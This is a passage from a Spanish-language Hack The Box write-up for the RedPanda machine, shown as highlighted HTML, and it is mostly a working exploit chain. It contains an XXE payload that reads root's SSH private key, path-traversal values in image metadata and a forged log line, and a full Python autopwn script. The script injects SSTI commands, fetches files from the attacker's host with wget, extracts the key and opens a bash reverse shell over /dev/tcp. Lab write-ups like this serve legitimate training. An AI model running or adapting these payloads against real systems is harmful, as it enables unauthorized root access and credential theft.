            <span class="nc">String</span> <span class="n">artist</span> <span class="o">=</span> <span class="n">getArtist</span><span class="o">(</span><span class="n">parsed_data</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"uri"</span><span class="o">).</span><span class="na">toString</span><span class="o">());</span>
            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Artist: "</span> <span class="o">+</span> <span class="n">artist</span><span class="o">);</span>
            <span class="nc">String</span> <span class="n">xmlPath</span> <span class="o">=</span> <span class="s">"/credits/"</span> <span class="o">+</span> <span class="n">artist</span> <span class="o">+</span> <span class="s">"_creds.xml"</span><span class="o">;</span>
            <span class="n">addViewTo</span><span class="o">(</span><span class="n">xmlPath</span><span class="o">,</span> <span class="n">parsed_data</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"uri"</span><span class="o">).</span><span class="na">toString</span><span class="o">());</span>
        <span class="o">}</span>

    <span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><p>Analizando el archivo, comprendemos que es el encargado de registrar y mostrar la tabla de créditos que recibe cada usuario al momento de ver una imagen:</p><blockquote><p>En la web</p></blockquote><p><img data-src="/assets/img/htb/writeups/redpanda/stats_web.png" alt="stats-web" class="shadow" data-proofer-ignore></p><p>También vemos que para mostrar la tabla con las vistas se lee la data de un archivo <code class="language-plaintext highlighter-rouge">.xml</code>. Esto ya es interesante y luego de un mayor análisis llegamos a la conclusión que es vulnerable a <strong>XML External Entity (XXE)</strong></p><p>La explicación es la siguiente:</p><ol><li>Por cada petición a la web, se guarda la data en un archivo log. (/opt/panda_search/redpanda.log)<li>Si lo registrado (log) contiene un <code class="language-plaintext highlighter-rouge">.jpg</code> se extrae el campo <strong>URI</strong> que es la ruta del archivo. (code||ip||agent||<strong>URI</strong>)<li>Luego se extrae de su metadata el nombre del artista dueño de la imagen. (/opt/panda_search/src/main/resources/static + <strong>URI</strong>)<li>Esa información se usa para buscar en una ruta específica el archivo <code class="language-plaintext highlighter-rouge">.xml</code> con los datos de las vistas del artista (/credits/ + artist + _creds.xml)<li>Por último, se procesa ese archivo <code class="language-plaintext highlighter-rouge">.xml</code> añadiendo la nueva data para luego mostrarla en la web</ol><p>Explotación:</p><blockquote><p>Nuestro objetivo es que se procese el archivo <code class="language-plaintext highlighter-rouge">.xml</code> que creemos el cuál contendrá el ataque <strong>XXE</strong> que nos permitirá leer archivos del sistema</p></blockquote><p>Como vemos en el paso <code class="language-plaintext highlighter-rouge">2</code>, primero descargamos una imagen <code class="language-plaintext highlighter-rouge">.jpg</code> cualquiera y le ponemos el nombre <code class="language-plaintext highlighter-rouge">pwned.jpg</code> para que sea válida</p><p>Como observamos en al paso <code class="language-plaintext highlighter-rouge">4</code>, el campo <strong>artist</strong> es el encargado de seleccionar el archivo <code class="language-plaintext highlighter-rouge">.xml</code>, entonces podemos hacer que el campo <strong>artist</strong> realize <strong>Path Traversal</strong> ya que como observamos solo existe una concatenación y no es sanitizado</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">❯ exiftool -Artist=../tmp/.privesc/pwned pwned.jpg
    1 image files updated
</span></pre></table></code></div></div><p>Ahora del paso <code class="language-plaintext highlighter-rouge">5</code>, debemos crear nuestro archivo <code class="language-plaintext highlighter-rouge">.xml</code> teniendo en cuenta que tengamos como nombre la metadata <strong>artist</strong> y la concatenación con _creds.xml:</p><blockquote><p>Nombre : pwned_creds.xml</p></blockquote><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa"&gt;</span> ]&gt; <span class="err">&lt;</span>-- Root private key!
<span class="nt">&lt;credits&gt;</span>
  <span class="nt">&lt;author&gt;</span>pwned<span class="nt">&lt;/author&gt;</span>
  <span class="nt">&lt;image&gt;</span>
    <span class="nt">&lt;uri&gt;</span>/img/greg.jpg<span class="nt">&lt;/uri&gt;</span>
    <span class="nt">&lt;views&gt;</span>6<span class="nt">&lt;/views&gt;</span>
  <span class="nt">&lt;/image&gt;</span>
  <span class="nt">&lt;xxe&gt;</span>
      <span class="ni">&amp;xxe;</span>
  <span class="nt">&lt;/xxe&gt;</span>
  <span class="nt">&lt;totalviews&gt;</span>12<span class="nt">&lt;/totalviews&gt;</span>
<span class="nt">&lt;/credits&gt;</span>
</pre></table></code></div></div><p>Ahora debemos subir ambos archivos <code class="language-plaintext highlighter-rouge">pwned.jpg</code> <code class="language-plaintext highlighter-rouge">pwned_creds.xml</code> a nuestro directorio de trabajo <code class="language-plaintext highlighter-rouge">/tmp/.privesc</code></p><p>Por último, como el paso <code class="language-plaintext highlighter-rouge">2</code> y <code class="language-plaintext highlighter-rouge">3</code>, creamos un log con el correcto formato y que otra vez realize <strong>Path Traversal</strong> a nuestro archivo <code class="language-plaintext highlighter-rouge">.jpg</code></p><blockquote><p>Nombre : redpanda.log (importante que el código sea 200 para que lo registre como petición exitosa)</p></blockquote><div class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="Text"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>200||ip||user_agent||/../../../../../../tmp/.privesc/pwned.jpg
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Tengamos en cuenta que podemos modificar el archivo <em>/opt/panda_search/redpanda.log</em> gracias a que somos parte del grupo <strong>logs</strong></p></div></blockquote><p>Ahora solo remplazamos este log por el original, esperamos unos minutos a que se procese y al visualizar nuestro archivo <code class="language-plaintext highlighter-rouge">pwned_creds.xml</code> veremos la llave del usuario <code class="language-plaintext highlighter-rouge">root</code></p><p>Para automatizar el proceso hice un autopwn en <code class="language-plaintext highlighter-rouge">python</code> que realiza todo lo mencionado anteriormente para obtener una shell como <code class="language-plaintext highlighter-rouge">root</code>:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">requests</span>                 <span class="c1"># pip3 install requests
</span><span class="kn">import</span> <span class="nn">shlex</span>
<span class="kn">import</span> <span class="nn">signal</span>
<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>   <span class="c1"># pip3 install BeautifulSoup4
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>               <span class="c1"># pip3 install pwntools
</span>
<span class="c1"># Autopwn Redpanda HTB machine
# ----------------------------
# author : Marss
# date : Sep 21, 2022
</span>
<span class="c1"># ctrl + c
</span><span class="k">def</span> <span class="nf">signal_handler</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">[!] Interrupted.'</span><span class="p">)</span>

<span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal_handler</span><span class="p">)</span>

<span class="c1"># global variables
</span><span class="n">redpanda_ip</span> <span class="o">=</span> <span class="s">'10.10.11.170'</span>
<span class="n">pwned_jpg</span> <span class="o">=</span> <span class="s">'pwned.jpg'</span>
<span class="n">pwned_xml</span> <span class="o">=</span> <span class="s">'pwned_creds.xml'</span>
<span class="n">pwned_log</span> <span class="o">=</span> <span class="s">'redpanda.log'</span>
<span class="n">share_server</span> <span class="o">=</span> <span class="s">'share_server.sh'</span>
<span class="n">workstation</span> <span class="o">=</span> <span class="s">'/tmp/.privesc'</span>

<span class="c1"># create SSTI inyection
</span><span class="k">def</span> <span class="nf">create_inyection</span><span class="p">(</span><span class="n">command</span><span class="p">):</span>
    <span class="n">command_convertion</span> <span class="o">=</span> <span class="s">''</span>
    <span class="n">position</span> <span class="o">=</span> <span class="mi">0</span>
    
    <span class="k">for</span> <span class="n">character</span> <span class="ow">in</span> <span class="n">command</span><span class="p">:</span>     
        <span class="n">character_value</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">character</span><span class="p">)</span> <span class="c1"># 97 = ord('a')
</span>        <span class="n">java_convertion</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'T(java.lang.Character).toString(</span><span class="si">{</span><span class="n">character_value</span><span class="si">}</span><span class="s">)'</span>

        <span class="c1"># convertion by position (brackets)
</span>        <span class="k">if</span> <span class="n">position</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">command_convertion</span> <span class="o">+=</span> <span class="n">java_convertion</span> <span class="o">+</span> <span class="s">'.concat('</span>
        <span class="k">elif</span> <span class="n">position</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">command</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">:</span> 
            <span class="n">command_convertion</span> <span class="o">+=</span> <span class="p">(</span><span class="n">java_convertion</span> <span class="o">+</span> <span class="s">').concat('</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">command_convertion</span> <span class="o">+=</span> <span class="p">(</span><span class="n">java_convertion</span> <span class="o">+</span> <span class="s">')'</span><span class="p">)</span>
        <span class="n">position</span> <span class="o">+=</span> <span class="mi">1</span>

    <span class="n">payload</span> <span class="o">=</span> <span class="s">'*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(%s).getInputStream())}'</span> <span class="o">%</span> <span class="n">command_convertion</span>
    
    <span class="k">return</span> <span class="n">payload</span>

<span class="c1"># return SSTI inyection
</span><span class="k">def</span> <span class="nf">get_inyection</span><span class="p">(</span><span class="n">command</span><span class="p">):</span> 
    <span class="k">return</span> <span class="n">create_inyection</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>

<span class="c1"># make post request
</span><span class="k">def</span> <span class="nf">make_request</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="c1"># create session
</span>        <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
        
        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'Content-Type'</span> <span class="p">:</span> <span class="s">'application/x-www-form-urlencoded'</span><span class="p">}</span>
        <span class="n">post_data</span> <span class="o">=</span> <span class="s">'name='</span> <span class="o">+</span> <span class="n">get_inyection</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        
        <span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">'http://</span><span class="si">{</span><span class="n">redpanda_ip</span><span class="si">}</span><span class="s">:8080/search'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>

    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\n</span><span class="s">[x] </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>


<span class="c1"># execute remote command
</span><span class="k">def</span> <span class="nf">run_redpanda_command</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">inyection</span><span class="p">):</span>
    <span class="n">command</span> <span class="o">=</span> <span class="n">inyection</span><span class="p">[</span><span class="n">name</span><span class="p">]</span>
    <span class="n">make_request</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>

<span class="c1"># execute local command
</span><span class="k">def</span> <span class="nf">run_local_command</span><span class="p">(</span><span class="n">command</span><span class="p">):</span>
    <span class="n">process</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">shlex</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="n">command</span><span class="p">),</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">DEVNULL</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">DEVNULL</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">process</span>

<span class="c1"># upload .xml, .jpg and log file
</span><span class="k">def</span> <span class="nf">upload_files</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">progress</span><span class="p">):</span>
    <span class="c1"># inyection commands
</span>    <span class="n">inyection</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">'workstation created'</span> <span class="p">:</span> <span class="sa">f</span><span class="s">'mkdir -p </span><span class="si">{</span><span class="n">workstation</span><span class="si">}</span><span class="s">'</span><span class="p">,</span>
        <span class="s">'.jpg uploaded'</span> <span class="p">:</span> <span class="sa">f</span><span class="s">'wget http://</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">ip</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">pwned_jpg</span><span class="si">}</span><span class="s"> -P </span><span class="si">{</span><span class="n">workstation</span><span class="si">}</span><span class="s">'</span><span class="p">,</span> 
        <span class="s">'.xml uploaded'</span> <span class="p">:</span> <span class="sa">f</span><span class="s">'wget http://</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">ip</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">pwned_xml</span><span class="si">}</span><span class="s"> -P </span><span class="si">{</span><span class="n">workstation</span><span class="si">}</span><span class="s">'</span><span class="p">,</span>
        <span class="s">'logs uploaded'</span> <span class="p">:</span> <span class="sa">f</span><span class="s">'wget http://</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">ip</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">pwned_log</span><span class="si">}</span><span class="s"> -O /opt/panda_search/</span><span class="si">{</span><span class="n">pwned_log</span><span class="si">}</span><span class="s">'</span><span class="p">,</span>
        <span class="s">'web server uploaded'</span> <span class="p">:</span> <span class="sa">f</span><span class="s">'wget http://</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">ip</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">share_server</span><span class="si">}</span><span class="s"> -P </span><span class="si">{</span><span class="n">workstation</span><span class="si">}</span><span class="s">'</span>
    <span class="p">}</span>
    
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">progress</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="sa">f</span><span class="s">'Opening web server by port </span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="si">}</span><span class="s"> to share files'</span><span class="p">)</span>
    
    <span class="k">try</span><span class="p">:</span>
        <span class="c1"># share webserver
</span>        <span class="n">server_process</span> <span class="o">=</span> <span class="n">run_local_command</span><span class="p">(</span><span class="sa">f</span><span class="s">'/usr/bin/python3 -m http.server </span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
    
        <span class="c1"># excute inyection commands (SSTI)
</span>        <span class="k">for</span> <span class="n">command</span> <span class="ow">in</span> <span class="n">inyection</span><span class="p">:</span>
            <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
            <span class="n">run_redpanda_command</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">inyection</span><span class="p">)</span>
            <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
        
        <span class="c1"># kill webserver process
</span>        <span class="n">server_process</span><span class="p">.</span><span class="n">kill</span><span class="p">()</span>
        
        <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
        <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'Files uploaded.'</span><span class="p">)</span>
        
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">error</span><span class="p">:</span>
        <span class="n">progress</span><span class="p">.</span><span class="n">failure</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">error</span><span class="si">}</span><span class="s"> ocurred.'</span><span class="p">)</span>

<span class="c1"># wait for log file processing
</span><span class="k">def</span> <span class="nf">xxe_attack_processing</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">progress</span><span class="p">):</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">progress</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="sa">f</span><span class="s">'Wait for XXE attack processing'</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">130</span><span class="p">):</span>
        <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">progress</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s">' (*/2 * * * * cron process)'</span><span class="p">)</span>
    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'Successful XXE attack.'</span><span class="p">)</span>

<span class="c1"># download .xml with processed data and extract key
</span><span class="k">def</span> <span class="nf">download_and_extract_key</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">progress</span><span class="p">,</span> <span class="n">local_commands</span><span class="p">,</span> <span class="n">remote_commands</span><span class="p">):</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">progress</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Downloading .xml file to extract id_rsa private key (root user)'</span><span class="p">)</span> 

    <span class="c1"># share webserver to local machine for specific time
</span>    <span class="n">run_redpanda_command</span><span class="p">(</span><span class="s">'share id_rsa_file'</span><span class="p">,</span> <span class="n">remote_commands</span><span class="p">)</span>
    
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="c1"># wait to download id_rsa to redpanda machine
</span>    <span class="n">run_local_command</span><span class="p">(</span><span class="n">local_commands</span><span class="p">[</span><span class="s">'download id_rsa'</span><span class="p">])</span>

    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'id_rsa_file downloaded'</span><span class="p">)</span>
    
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">progress</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Extracting private key'</span><span class="p">)</span>
    
    <span class="c1"># extract id_rsa
</span>    <span class="n">id_rsa_file</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s">'id_rsa_file'</span><span class="p">),</span> <span class="n">features</span><span class="o">=</span><span class="s">'xml'</span><span class="p">)</span>
    <span class="n">id_rsa_content</span> <span class="o">=</span> <span class="n">id_rsa_file</span><span class="p">.</span><span class="n">xxe</span><span class="p">.</span><span class="n">string</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span> <span class="c1"># Important add '\n'!
</span>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'id_rsa_root'</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
        <span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">id_rsa_content</span><span class="p">)</span>
    
    <span class="c1"># assign permisisons to id_rsa 
</span>    <span class="n">run_local_command</span><span class="p">(</span><span class="n">local_commands</span><span class="p">[</span><span class="s">'assign permissions'</span><span class="p">])</span>
    <span class="n">run_redpanda_command</span><span class="p">(</span><span class="s">'kill server'</span><span class="p">,</span> <span class="n">remote_commands</span><span class="p">)</span>

<span class="c1"># create reverse shell coonnection
</span><span class="k">def</span> <span class="nf">reverse_shell</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">progress</span><span class="p">,</span> <span class="n">local_command</span><span class="p">):</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">progress</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Starting reverse shell process'</span><span class="p">)</span>
    
    <span class="c1"># listen mode to receive the shell
</span>    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\n</span><span class="s">[+] Open port </span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="si">}</span><span class="s"> to receive shell. (e.g nc -lvnp </span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="si">}</span><span class="s">)'</span><span class="p">)</span>
    <span class="nb">input</span><span class="p">(</span><span class="s">'Press to continue...'</span><span class="p">)</span>
    
    <span class="c1"># execute reverse shell like root
</span>    <span class="n">run_local_command</span><span class="p">(</span><span class="n">local_command</span><span class="p">)</span>

<span class="c1"># exploit process
</span><span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
    <span class="n">progress</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">'Starting attack'</span><span class="p">)</span>
    
    <span class="c1"># create workstation and upload files to XXE attack
</span>    <span class="n">upload_files</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">progress</span><span class="p">)</span>

    <span class="c1"># wait for XXE file processing and extract to local machine
</span>    <span class="n">xxe_attack_processing</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">progress</span><span class="p">)</span>

    <span class="c1"># remote and local commands
</span>    <span class="n">redpanda_machine</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">'share id_rsa_file'</span> <span class="p">:</span> <span class="sa">f</span><span class="s">'/bin/bash </span><span class="si">{</span><span class="n">workstation</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">share_server</span><span class="si">}</span><span class="s">'</span><span class="p">,</span>
        <span class="s">'remove files'</span> <span class="p">:</span> <span class="sa">f</span><span class="s">'/usr/bin/rm -r </span><span class="si">{</span><span class="n">workstation</span><span class="si">}</span><span class="s">'</span><span class="p">,</span>
        <span class="s">'kill server'</span><span class="p">:</span> <span class="s">'fuser -k 7777/tcp'</span>
    <span class="p">}</span>
    <span class="n">local_machine</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">'download id_rsa'</span> <span class="p">:</span> <span class="sa">f</span><span class="s">'/usr/bin/wget http://</span><span class="si">{</span><span class="n">redpanda_ip</span><span class="si">}</span><span class="s">:7777/</span><span class="si">{</span><span class="n">pwned_xml</span><span class="si">}</span><span class="s"> -O id_rsa_file'</span><span class="p">,</span>
        <span class="s">'assign permissions'</span> <span class="p">:</span> <span class="s">'/usr/bin/chmod 600 id_rsa_root'</span><span class="p">,</span>
        <span class="s">'ssh reverse'</span> <span class="p">:</span> <span class="sa">f</span><span class="s">'/usr/bin/ssh -q -i id_rsa_root root@</span><span class="si">{</span><span class="n">redpanda_ip</span><span class="si">}</span><span class="s"> "/bin/bash -c </span><span class="se">\'</span><span class="s">/bin/bash -i &gt;&amp; /dev/tcp/</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">ip</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="si">}</span><span class="s"> 0&gt;&amp;1</span><span class="se">\'</span><span class="s">"'</span>
    <span class="p">}</span>

    <span class="c1"># download .xml and extract private key
</span>    <span class="n">download_and_extract_key</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">progress</span><span class="p">,</span> <span class="n">local_machine</span><span class="p">,</span> <span class="n">redpanda_machine</span><span class="p">)</span>
 
    <span class="c1"># remove workstation and files on redpanda machine
</span>    <span class="n">run_redpanda_command</span><span class="p">(</span><span class="s">'remove files'</span><span class="p">,</span> <span class="n">redpanda_machine</span><span class="p">)</span>

    <span class="c1"># init reverse shell by SSH
</span>    <span class="n">reverse_shell</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">progress</span><span class="p">,</span> <span class="n">local_machine</span><span class="p">[</span><span class="s">'ssh reverse'</span><span class="p">])</span>

<span class="c1"># main program flow and argument declaration
</span><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span>
        <span class="n">description</span><span class="o">=</span><span class="s">'Autopwn Redpanda HTB machine'</span><span class="p">,</span>
        <span class="n">formatter_class</span><span class="o">=</span><span class="n">argparse</span><span class="p">.</span><span class="n">RawDescriptionHelpFormatter</span><span class="p">,</span>
        <span class="n">epilog</span><span class="o">=</span><span class="s">'''Example:
        autopwn.py -i 10.10.10.10 -p 4444
        '''</span><span class="p">)</span>

    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-i'</span><span class="p">,</span> <span class="s">'--ip'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'specific IP to receive the shell'</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-p'</span><span class="p">,</span> <span class="s">'--port'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'specific PORT to receive the shell'</span><span class="p">)</span>

    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>

    <span class="n">run</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
</pre></table></code></div></div><p>Ahora solo lo ejecutamos, esperamos el proceso, conseguimos la shell y la flag:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
